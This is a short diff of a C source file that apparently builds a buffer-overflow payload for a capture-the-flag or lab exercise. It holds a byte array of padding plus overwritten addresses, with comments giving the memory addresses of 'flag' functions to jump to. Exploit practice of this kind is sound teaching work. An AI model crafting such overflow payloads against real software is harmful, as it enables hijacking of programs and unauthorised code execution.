@@ -16,7 +16,7 @@ unsigned char payload[] =
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
 	'H', 'A', 'H', 'A', 0x12, 0x71, 0x88, 0x0c,
-	'H', 'A', 'H', 'A', 0xe0, 0xb6, 0xff, 0xbf, 'd', '\0', 'L'};
+	'H', 'A', 'H', 'A', 0x08, 0x80, 0x88, 0x0c, 'd', '\0', 'L'};
 	//0x0c88724b is memory address of flag 1 function
 	//0x0c8871bb is memory address of flag 2 function
 	//0x0c887112 is memory address of flag 3 function
